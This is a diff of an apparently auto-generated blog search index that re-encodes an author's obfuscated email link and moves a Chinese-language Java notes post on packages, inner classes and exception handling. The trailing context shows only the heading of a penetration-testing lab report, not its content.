@@ -290,7 +290,7 @@
     <content><![CDATA[<blockquote>
 <p>iOS assignment 1: Calculator App.</p>
 <p>姓名：可弟WZ Kekwy</p>
-<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#107;&#107;&#x65;&#x77;&#x79;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#107;&#101;&#x65;&#107;&#107;&#x65;&#x77;&#x79;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x6b;&#101;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>
 </blockquote>
 <p>用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。</p>
 <p><strong>项目仓库：</strong><a href="https://github.com/Kekwy/iwork1-Calculator">https://github.com/Kekwy/iwork1-Calculator</a></p>
@@ -492,7 +492,7 @@
     <title>【iOS开发】IW2 新闻APP</title>
     <url>/iw2-newsapp/</url>
     <content><![CDATA[<blockquote>
-<p><a href="mailto:&#107;&#101;&#x65;&#107;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#107;&#101;&#x65;&#107;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p><a href="mailto:&#x6b;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x6b;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>
 </blockquote>
 <ul>
 <li><a href="#%E7%AE%80%E4%BB%8B">简介</a><ul>
@@ -712,219 +712,6 @@
 <p>实现接口使用关键字 <code>implements</code> ：</p>
 <p>tips：Java中不许出现多继承但是可以通过同一个类实现许多接口来实现多继承，一个接口也可以继承另一个接口。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span></span><br><span class="line">class 类名 implements 接口<span class="number">1</span>，接口<span class="number">2</span>, ... &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">intf1</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">intf2</span> <span class="keyword">extends</span> <span class="title class_">intf1</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>参考资料《Java从入门到精通（第5版）》</p>
-]]></content>
-      <categories>
-        <category>从继承开始的Java应用笔记</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>学习</tag>
-        <tag>编程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>类的高级特性与异常处理</title>
-    <url>/javaNotes-2/</url>
-    <content><![CDATA[<h2 id="I-Java类包"><a href="#I-Java类包" class="headerlink" title="I. Java类包"></a>I. Java类包</h2><ol>
-<li><p>类名冲突：</p>
-<p>任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。</p>
-</li>
-<li><p>类的路径：</p>
-<ul>
-<li>同一个类包中的类相互访问时，可以不指定包名；</li>
-<li>同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。</li>
-</ul>
-</li>
-<li><p>指定包与导入包：</p>
-<p>将 <code>package</code> 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名;</span><br></pre></td></tr></table></figure>
-
-<p>导入包：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.*</span><br><span class="line"><span class="keyword">import</span> 包名.类名</span><br><span class="line"><span class="keyword">import</span> 包名.静态方法名</span><br></pre></td></tr></table></figure>
-<p>tips: </p>
-<p>使用 <code>import</code> 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。</p>
-</li>
-</ol>
-<h2 id="II-final-关键字"><a href="#II-final-关键字" class="headerlink" title="II. final 关键字"></a>II. final 关键字</h2><ol>
-<li>变量：<ul>
-<li>修饰常量变量；</li>
-<li>对象引用被 <code>final</code> 修饰后无法使其指向另一个对象；</li>
-<li>Java中定义全局变量，通常使用 <code>public static final</code> 修饰，是能在定义时被赋值。</li>
-</ul>
-</li>
-<li>方法：<ul>
-<li>被 <code>final</code> 修饰的方法不能被重写；</li>
-<li><code>private</code> 方法隐式被指定为 <code>final</code> 类型。</li>
-</ul>
-</li>
-<li>类：<ul>
-<li>被修饰的类不能被继承。</li>
-</ul>
-</li>
-</ol>
-<h2 id="III-内部类"><a href="#III-内部类" class="headerlink" title="III. 内部类"></a>III. 内部类</h2><h3 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h3><ol>
-<li><p>基础用法：</p>
-<ul>
-<li><p>成员内部类的定义：（非内部类不能被声明为private或protected访问类型）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;			<span class="comment">// 外部类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;		<span class="comment">// 内部类</span></span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）；</p>
-</li>
-<li><p>内部类中的变量与外部类变量同名时，可以使用 <code>this</code> 指针加以区分：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 若内部类与外部类中均有变量x</span></span><br><span class="line"><span class="built_in">this</span>.x; <span class="comment">// 内部类的x</span></span><br><span class="line">OuterClass.<span class="built_in">this</span>.x; <span class="comment">// 外部类的x</span></span><br><span class="line">x; <span class="comment">// 同名局部变量、形参（若有）</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在外部类和非静态方法之外实例化内部类对象，需要使用外部类：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> = <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">OuterClass.<span class="type">innerClass</span> <span class="variable">in</span> <span class="operator">=</span> out.<span class="keyword">new</span> <span class="title class_">innerClass</span>();</span><br></pre></td></tr></table></figure>
-
-<p>内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。</p>
-</li>
-</ul>
-</li>
-<li><p>内部类向上转型为接口;</p>
-<ul>
-<li>将一个权限修饰符为 <code>private</code> 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程；</li>
-<li>对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法；</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个外部不可访问的内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> <span class="keyword">implements</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">        <span class="comment">// 实现接口方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// do something...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> OutInterface doit &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InnerClass</span>(); <span class="comment">// 将内部类向上转型为外部接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line"><span class="type">OutInterface</span> <span class="variable">outinter</span> <span class="operator">=</span> out.doit();</span><br><span class="line">outinter.f();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口）</p>
-</li>
-</ol>
-<h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><ul>
-<li><p>内部类可以在类的局部位置定义（如方法）</p>
-</li>
-<li><p>在方法中定义的内部类只能使用方法中被 <code>final</code> 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。</p>
-</li>
-</ul>
-<h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">A</span>() &#123;</span><br><span class="line">	...<span class="comment">//内部类体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。</p>
-<h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><ul>
-<li>创建静态内部类的对象不需要其外部类的对象；</li>
-<li>静态内部类的对象中不能访问非静态外部类的对象。</li>
-</ul>
-<h3 id="内部类的继承"><a href="#内部类的继承" class="headerlink" title="内部类的继承"></a>内部类的继承</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutputInnerClass</span> <span class="keyword">extends</span> <span class="title class_">ClassA</span>.ClassB &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">OutputInnerClass</span><span class="params">(classA a)</span> &#123;</span><br><span class="line">		a.<span class="built_in">super</span>();		<span class="comment">// 生成B类的外部类对象</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="IV-异常捕捉"><a href="#IV-异常捕捉" class="headerlink" title="IV. 异常捕捉"></a>IV. 异常捕捉</h2><ol>
-<li><p><code>try-catch</code> 语句：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可以发生异常的代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>finally</code> 语句：</p>
-<p>无论 <code>try</code> 中的语句是否发生异常，都会执行 <code>finally</code> 中的代码块。<code>finally</code> 不被执行的情况：</p>
-<ul>
-<li><code>finally</code> 中发生异常；</li>
-<li>之前的代码中使用 <code>System.exit()</code> 退出程序；</li>
-<li>程序所在的线程死亡；</li>
-<li>关闭CPU。</li>
-</ul>
-</li>
-</ol>
-<p>tips：</p>
-<ul>
-<li><code>Exception</code> 是 <code>try</code> 代码传递给 <code>catch</code> 代码块的变量类型；</li>
-<li>异常处理常用的函数：<ul>
-<li><code>getMessage()</code> ：输出错误性质；</li>
-<li><code>toString()</code> ：给出异常的类型与性质；</li>
-<li><code>printStackTrace()</code> ：指出异常的类型、性质、栈层次及出现在程序中的位置。</li>
-</ul>
-</li>
-</ul>
-<h2 id="V-Java常见异常"><a href="#V-Java常见异常" class="headerlink" title="V. Java常见异常"></a>V. Java常见异常</h2><table>
-<thead>
-<tr>
-<th>异常类</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ClassCastException</td>
-<td>类型转换异常</td>
-</tr>
-<tr>
-<td>ClassNotFoundException</td>
-<td>未找到相应类异常</td>
-</tr>
-<tr>
-<td>ArithmeticException</td>
-<td>算术异常</td>
-</tr>
-<tr>
-<td>ArrayIndexOutOfBoundsException</td>
-<td>数组下标越界异常</td>
-</tr>
-<tr>
-<td>ArrayStoreException</td>
-<td>数组中包含不兼容的值抛出的异常</td>
-</tr>
-<tr>
-<td>SQLException</td>
-<td>操作数据库异常</td>
-</tr>
-<tr>
-<td>NullPointerException</td>
-<td>空指针异常</td>
-</tr>
-<tr>
-<td>NoSuchFieldException</td>
-<td>字段未找到异常</td>
-</tr>
-<tr>
-<td>NoSuchMethodException</td>
-<td>方法未找到异常</td>
-</tr>
-<tr>
-<td>NumberFormatException</td>
-<td>字符串转换为数字抛出的异常</td>
-</tr>
-<tr>
-<td>NegativeArraySizeException</td>
-<td>数组元素个数为负数抛出的异常</td>
-</tr>
-<tr>
-<td>StringIndexOutOfBoundsException</td>
-<td>字符串索引超出范围抛出的异常</td>
-</tr>
-<tr>
-<td>IOException</td>
-<td>输入输出异常</td>
-</tr>
-<tr>
-<td>IllegalAccessException</td>
-<td>不允许访问某类异常</td>
-</tr>
-<tr>
-<td>InstantiationException</td>
-<td>当应用程序试图使用 <code>Class</code> 类中的 <code>new Instance()</code> 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常</td>
-</tr>
-<tr>
-<td>EOFException</td>
-<td>文件已结束异常</td>
-</tr>
-<tr>
-<td>FileNotFoundException</td>
-<td>文件未找到异常</td>
-</tr>
-</tbody></table>
-<h2 id="VI-自定义异常"><a href="#VI-自定义异常" class="headerlink" title="VI. 自定义异常"></a>VI. 自定义异常</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String ErrorMessage)</span> &#123; <span class="comment">// ErrorMessage为要输出的错误信息</span></span><br><span class="line">        <span class="built_in">super</span>(ErrorMessage);				  <span class="comment">// 调用父类构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="VII-抛出异常"><a href="#VII-抛出异常" class="headerlink" title="VII. 抛出异常"></a>VII. 抛出异常</h2><ol>
-<li><p>throws：用于指定方法可能抛出的异常，用于将异常向上抛出。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> 异常<span class="number">1</span>, 异常<span class="number">2</span>, ... &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>throw：</p>
-<ul>
-<li>程序在执行到 <code>throw</code> 语句时立即终止，其后语句都不执行；</li>
-<li><code>throw</code> 抛出的异常必须使用 <code>try-catch</code> 语句快捕捉；</li>
-<li>若想向上级抛出异常，必须在抛出异常的方法中使用 <code>throws</code>。</li>
-<li></li>
-</ul>
-</li>
 </ol>
 <p>参考资料《Java从入门到精通（第5版）》</p>
 ]]></content>
@@ -1168,11 +955,224 @@
       </tags>
   </entry>
   <entry>
+    <title>类的高级特性与异常处理</title>
+    <url>/javaNotes-2/</url>
+    <content><![CDATA[<h2 id="I-Java类包"><a href="#I-Java类包" class="headerlink" title="I. Java类包"></a>I. Java类包</h2><ol>
+<li><p>类名冲突：</p>
+<p>任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。</p>
+</li>
+<li><p>类的路径：</p>
+<ul>
+<li>同一个类包中的类相互访问时，可以不指定包名；</li>
+<li>同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。</li>
+</ul>
+</li>
+<li><p>指定包与导入包：</p>
+<p>将 <code>package</code> 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名;</span><br></pre></td></tr></table></figure>
+
+<p>导入包：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.*</span><br><span class="line"><span class="keyword">import</span> 包名.类名</span><br><span class="line"><span class="keyword">import</span> 包名.静态方法名</span><br></pre></td></tr></table></figure>
+<p>tips: </p>
+<p>使用 <code>import</code> 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。</p>
+</li>
+</ol>
+<h2 id="II-final-关键字"><a href="#II-final-关键字" class="headerlink" title="II. final 关键字"></a>II. final 关键字</h2><ol>
+<li>变量：<ul>
+<li>修饰常量变量；</li>
+<li>对象引用被 <code>final</code> 修饰后无法使其指向另一个对象；</li>
+<li>Java中定义全局变量，通常使用 <code>public static final</code> 修饰，是能在定义时被赋值。</li>
+</ul>
+</li>
+<li>方法：<ul>
+<li>被 <code>final</code> 修饰的方法不能被重写；</li>
+<li><code>private</code> 方法隐式被指定为 <code>final</code> 类型。</li>
+</ul>
+</li>
+<li>类：<ul>
+<li>被修饰的类不能被继承。</li>
+</ul>
+</li>
+</ol>
+<h2 id="III-内部类"><a href="#III-内部类" class="headerlink" title="III. 内部类"></a>III. 内部类</h2><h3 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h3><ol>
+<li><p>基础用法：</p>
+<ul>
+<li><p>成员内部类的定义：（非内部类不能被声明为private或protected访问类型）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;			<span class="comment">// 外部类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;		<span class="comment">// 内部类</span></span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）；</p>
+</li>
+<li><p>内部类中的变量与外部类变量同名时，可以使用 <code>this</code> 指针加以区分：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 若内部类与外部类中均有变量x</span></span><br><span class="line"><span class="built_in">this</span>.x; <span class="comment">// 内部类的x</span></span><br><span class="line">OuterClass.<span class="built_in">this</span>.x; <span class="comment">// 外部类的x</span></span><br><span class="line">x; <span class="comment">// 同名局部变量、形参（若有）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在外部类和非静态方法之外实例化内部类对象，需要使用外部类：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> = <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">OuterClass.<span class="type">innerClass</span> <span class="variable">in</span> <span class="operator">=</span> out.<span class="keyword">new</span> <span class="title class_">innerClass</span>();</span><br></pre></td></tr></table></figure>
+
+<p>内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。</p>
+</li>
+</ul>
+</li>
+<li><p>内部类向上转型为接口;</p>
+<ul>
+<li>将一个权限修饰符为 <code>private</code> 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程；</li>
+<li>对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法；</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个外部不可访问的内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> <span class="keyword">implements</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">        <span class="comment">// 实现接口方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// do something...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> OutInterface doit &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InnerClass</span>(); <span class="comment">// 将内部类向上转型为外部接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line"><span class="type">OutInterface</span> <span class="variable">outinter</span> <span class="operator">=</span> out.doit();</span><br><span class="line">outinter.f();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口）</p>
+</li>
+</ol>
+<h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><ul>
+<li><p>内部类可以在类的局部位置定义（如方法）</p>
+</li>
+<li><p>在方法中定义的内部类只能使用方法中被 <code>final</code> 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。</p>
+</li>
+</ul>
+<h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">A</span>() &#123;</span><br><span class="line">	...<span class="comment">//内部类体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。</p>
+<h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><ul>
+<li>创建静态内部类的对象不需要其外部类的对象；</li>
+<li>静态内部类的对象中不能访问非静态外部类的对象。</li>
+</ul>
+<h3 id="内部类的继承"><a href="#内部类的继承" class="headerlink" title="内部类的继承"></a>内部类的继承</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutputInnerClass</span> <span class="keyword">extends</span> <span class="title class_">ClassA</span>.ClassB &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">OutputInnerClass</span><span class="params">(classA a)</span> &#123;</span><br><span class="line">		a.<span class="built_in">super</span>();		<span class="comment">// 生成B类的外部类对象</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="IV-异常捕捉"><a href="#IV-异常捕捉" class="headerlink" title="IV. 异常捕捉"></a>IV. 异常捕捉</h2><ol>
+<li><p><code>try-catch</code> 语句：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可以发生异常的代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>finally</code> 语句：</p>
+<p>无论 <code>try</code> 中的语句是否发生异常，都会执行 <code>finally</code> 中的代码块。<code>finally</code> 不被执行的情况：</p>
+<ul>
+<li><code>finally</code> 中发生异常；</li>
+<li>之前的代码中使用 <code>System.exit()</code> 退出程序；</li>
+<li>程序所在的线程死亡；</li>
+<li>关闭CPU。</li>
+</ul>
+</li>
+</ol>
+<p>tips：</p>
+<ul>
+<li><code>Exception</code> 是 <code>try</code> 代码传递给 <code>catch</code> 代码块的变量类型；</li>
+<li>异常处理常用的函数：<ul>
+<li><code>getMessage()</code> ：输出错误性质；</li>
+<li><code>toString()</code> ：给出异常的类型与性质；</li>
+<li><code>printStackTrace()</code> ：指出异常的类型、性质、栈层次及出现在程序中的位置。</li>
+</ul>
+</li>
+</ul>
+<h2 id="V-Java常见异常"><a href="#V-Java常见异常" class="headerlink" title="V. Java常见异常"></a>V. Java常见异常</h2><table>
+<thead>
+<tr>
+<th>异常类</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ClassCastException</td>
+<td>类型转换异常</td>
+</tr>
+<tr>
+<td>ClassNotFoundException</td>
+<td>未找到相应类异常</td>
+</tr>
+<tr>
+<td>ArithmeticException</td>
+<td>算术异常</td>
+</tr>
+<tr>
+<td>ArrayIndexOutOfBoundsException</td>
+<td>数组下标越界异常</td>
+</tr>
+<tr>
+<td>ArrayStoreException</td>
+<td>数组中包含不兼容的值抛出的异常</td>
+</tr>
+<tr>
+<td>SQLException</td>
+<td>操作数据库异常</td>
+</tr>
+<tr>
+<td>NullPointerException</td>
+<td>空指针异常</td>
+</tr>
+<tr>
+<td>NoSuchFieldException</td>
+<td>字段未找到异常</td>
+</tr>
+<tr>
+<td>NoSuchMethodException</td>
+<td>方法未找到异常</td>
+</tr>
+<tr>
+<td>NumberFormatException</td>
+<td>字符串转换为数字抛出的异常</td>
+</tr>
+<tr>
+<td>NegativeArraySizeException</td>
+<td>数组元素个数为负数抛出的异常</td>
+</tr>
+<tr>
+<td>StringIndexOutOfBoundsException</td>
+<td>字符串索引超出范围抛出的异常</td>
+</tr>
+<tr>
+<td>IOException</td>
+<td>输入输出异常</td>
+</tr>
+<tr>
+<td>IllegalAccessException</td>
+<td>不允许访问某类异常</td>
+</tr>
+<tr>
+<td>InstantiationException</td>
+<td>当应用程序试图使用 <code>Class</code> 类中的 <code>new Instance()</code> 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常</td>
+</tr>
+<tr>
+<td>EOFException</td>
+<td>文件已结束异常</td>
+</tr>
+<tr>
+<td>FileNotFoundException</td>
+<td>文件未找到异常</td>
+</tr>
+</tbody></table>
+<h2 id="VI-自定义异常"><a href="#VI-自定义异常" class="headerlink" title="VI. 自定义异常"></a>VI. 自定义异常</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String ErrorMessage)</span> &#123; <span class="comment">// ErrorMessage为要输出的错误信息</span></span><br><span class="line">        <span class="built_in">super</span>(ErrorMessage);				  <span class="comment">// 调用父类构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="VII-抛出异常"><a href="#VII-抛出异常" class="headerlink" title="VII. 抛出异常"></a>VII. 抛出异常</h2><ol>
+<li><p>throws：用于指定方法可能抛出的异常，用于将异常向上抛出。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> 异常<span class="number">1</span>, 异常<span class="number">2</span>, ... &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>throw：</p>
+<ul>
+<li>程序在执行到 <code>throw</code> 语句时立即终止，其后语句都不执行；</li>
+<li><code>throw</code> 抛出的异常必须使用 <code>try-catch</code> 语句快捕捉；</li>
+<li>若想向上级抛出异常，必须在抛出异常的方法中使用 <code>throws</code>。</li>
+<li></li>
+</ul>
+</li>
+</ol>
+<p>参考资料《Java从入门到精通（第5版）》</p>
+]]></content>
+      <categories>
+        <category>从继承开始的Java应用笔记</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>学习</tag>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【渗透测试】第五周 vulnhub-</title>
     <url>/lab5-report/</url>
     <content><![CDATA[<h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
 <p>网络攻防实战 第七次实验</p>
